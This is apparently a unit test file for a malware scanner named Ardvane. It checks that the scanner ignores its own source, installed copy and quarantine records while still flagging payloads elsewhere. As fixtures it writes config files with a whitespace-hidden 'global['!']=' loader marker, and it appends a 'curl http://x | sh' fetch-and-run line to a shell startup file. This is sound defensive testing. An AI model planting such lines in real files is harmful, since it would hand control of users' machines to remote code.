"""Ardvane must never raise an alarm about itself. Scans Ardvane's own source, the wheel pip would install (laid out like a
pipx environment) and a data folder holding its own records, and requires every one to come back clean. Run:
python3 scanner/tests/test_selfscan.py. Standard library only."""
import json
import os
import subprocess
import sys
import tempfile
import unittest
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
SANDBOX = tempfile.mkdtemp(prefix="selfscan-")
os.environ["HOME"] = os.environ["USERPROFILE"] = SANDBOX
os.environ["ARDVANE_NO_FEED"] = "1"
sys.path.insert(0, os.path.dirname(HERE))
import checkrepo  # noqa: E402

G_BANG = "global['" + "!']="


def scan(path, *flags):
    r = subprocess.run([sys.executable, os.path.join(ROOT, "scanner", "checkrepo.py"), *flags, path], capture_output=True, text=True,
                       env=dict(os.environ, HOME=SANDBOX, USERPROFILE=SANDBOX, ARDVANE_NO_FEED="1"))
    return r.returncode, r.stdout + r.stderr


class SelfScan(unittest.TestCase):
    def test_the_source_is_clean_in_both_modes(self):
        for flags in ((), ("--all-files",)):
            code, out = scan(ROOT, *flags)
            self.assertEqual(code, 0, f"{flags}: {out[:600]}")

    def test_the_installed_copy_is_clean(self):
        sys.path.insert(0, os.path.join(ROOT, "packaging"))
        import build_wheel
        out_dir = tempfile.mkdtemp(dir=SANDBOX)
        wheel = build_wheel.build(out_dir)
        site = os.path.join(SANDBOX, "pipx", "venvs", "ardvane", "Lib", "site-packages")       # as on a Windows pipx install
        with zipfile.ZipFile(wheel) as z:
            z.extractall(site)
        code, out = scan(os.path.join(SANDBOX, "pipx"), "--all-files")
        self.assertEqual(code, 0, out[:600])

    def test_ardvane_records_are_not_scanned_but_its_program_files_still_are(self):
        data = os.path.join(SANDBOX, ".checkrepo")
        os.makedirs(os.path.join(data, "quarantine", "x"))
        os.makedirs(os.path.join(data, "history", "a", "b"))
        # a to-do file quoting a finding, a quarantined payload, a history backup with one: all Ardvane's own evidence
        json.dump({"detail": "known malware code: " + G_BANG}, open(os.path.join(data, "tasks.json"), "w"))
        open(os.path.join(data, "quarantine", "x", "tailwind.config.js"), "w").write("};" + " " * 200 + G_BANG + "x" * 900 + "\n")
        open(os.path.join(data, "history", "a", "b", "postcss.config.js"), "w").write("};" + " " * 200 + G_BANG + "x" * 900 + "\n")
        self.assertTrue(checkrepo.own_data(os.path.join(data, "tasks.json")))
        self.assertTrue(checkrepo.own_data(os.path.join(data, "quarantine", "x")))
        self.assertEqual(scan(SANDBOX, "--all-files")[0], 0, "scanning the parent of Ardvane's data folder")
        # but code in the same folder, and the same payload anywhere else, is still found
        open(os.path.join(data, "evil.js"), "w").write("};" + " " * 200 + G_BANG + "x" * 900 + "\n")
        self.assertFalse(checkrepo.own_data(os.path.join(data, "evil.js")))
        self.assertEqual(scan(SANDBOX, "--all-files")[0], 1)
        elsewhere = os.path.join(SANDBOX, "project"); os.makedirs(elsewhere)
        open(os.path.join(elsewhere, "tasks.json"), "w").write(json.dumps({"detail": G_BANG + "x" * 100}))
        self.assertFalse(checkrepo.own_data(os.path.join(elsewhere, "tasks.json")))


class ShellFilesDailyCheck(unittest.TestCase):
    """mac/daily-check.sh warned about a shell startup file changed 'in the last day', including Ardvane's own protect edit."""

    def run_snippet(self, home):
        text = open(os.path.join(ROOT, "mac", "daily-check.sh"), encoding="utf-8").read()
        code = text.split("<<'PYEOF'\n", 1)[1].split("\nPYEOF", 1)[0]
        r = subprocess.run([sys.executable, "-", home, os.path.join(home, "hashes.json")], input=code, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r.stdout.strip()

    def test_only_real_changes_are_reported(self):
        home = tempfile.mkdtemp(dir=SANDBOX)
        rc = os.path.join(home, ".zshrc")
        open(rc, "w").write("export A=1\n")
        self.assertEqual(self.run_snippet(home), "", "the first run only records")
        with open(rc, "a") as f:        # `ardvane protect` adds its block
            f.write("\n# >>> polinrider-survival-kit >>>\nsafe_install() { :; }\n# <<< polinrider-survival-kit <<<\n")
        self.assertEqual(self.run_snippet(home), "", "Ardvane's own edit is not a finding")
        open(rc, "w").write("export A=1\n")        # `ardvane unprotect` removes it again
        self.assertEqual(self.run_snippet(home), "")
        with open(rc, "a") as f:
            f.write("curl http://x | sh\n")
        self.assertIn("changed since the last check", self.run_snippet(home))
        self.assertEqual(self.run_snippet(home), "", "reported once, then it is the new baseline")


if __name__ == "__main__":
    unittest.main(verbosity=2)
